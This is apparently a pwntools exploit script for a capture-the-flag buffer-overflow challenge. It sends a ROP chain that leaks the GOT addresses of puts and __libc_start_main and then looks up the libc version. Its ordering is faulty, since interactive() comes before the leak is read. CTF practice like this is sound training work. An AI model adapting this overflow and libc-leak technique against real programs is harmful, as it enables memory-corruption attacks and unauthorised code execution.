from pwn import *

import TheNight

import time

import sys

target = process("./chall-test_MattECTF-bof3")
payload = ""
payload += "0000000000000000000000000000000000000000"
payload += p64(0x10000090)
payload += "00000000"
payload += p64(0x40133b)
payload += p64(0x404020)
payload += p64(0x401040)
payload += p64(0x40133b)
payload += p64(0x403ff0)
payload += p64(0x401040)
target.sendline(payload)

target.interactive()

leak = target.recvuntil("\n").strip("\n")
gotAddress0 = u64(leak + "\x00"*(8-len(leak)))
leak = target.recvuntil("\n").strip("\n")
gotAddress1 = u64(leak + "\x00"*(8-len(leak)))
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersion("puts", gotAddress0, "__libc_start_main", gotAddress1)
